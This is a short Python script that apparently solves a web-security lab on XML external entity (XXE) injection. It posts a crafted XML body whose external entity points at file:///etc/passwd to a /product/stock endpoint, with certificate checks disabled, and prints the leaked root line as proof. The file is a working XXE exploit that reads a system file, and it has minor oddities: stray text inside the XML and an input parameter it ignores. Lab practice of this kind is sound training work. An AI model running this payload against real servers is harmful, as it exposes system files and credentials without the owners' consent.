import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting XXE using external entities to retrieve files"


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    print(Fore.WHITE + "[+] Using an external entity to retrieve the content of /etc/passwd")

    payload = """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>external entities
                    external entities
                </stockCheck>"""

    headers = {"Content-Type": "application/xml"}

    try:
        injection = requests.post(
            f"{url}/product/stock", data=payload, headers=headers, verify=False, proxies=proxies)

        print(Fore.WHITE + "[+] Extracting the first line as a proof")

        first_line = re.findall("/(root:.*)\n", injection.text)[0]

        print(Fore.GREEN + "first line" + Fore.WHITE +
              " => " + Fore.YELLOW + first_line)

        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
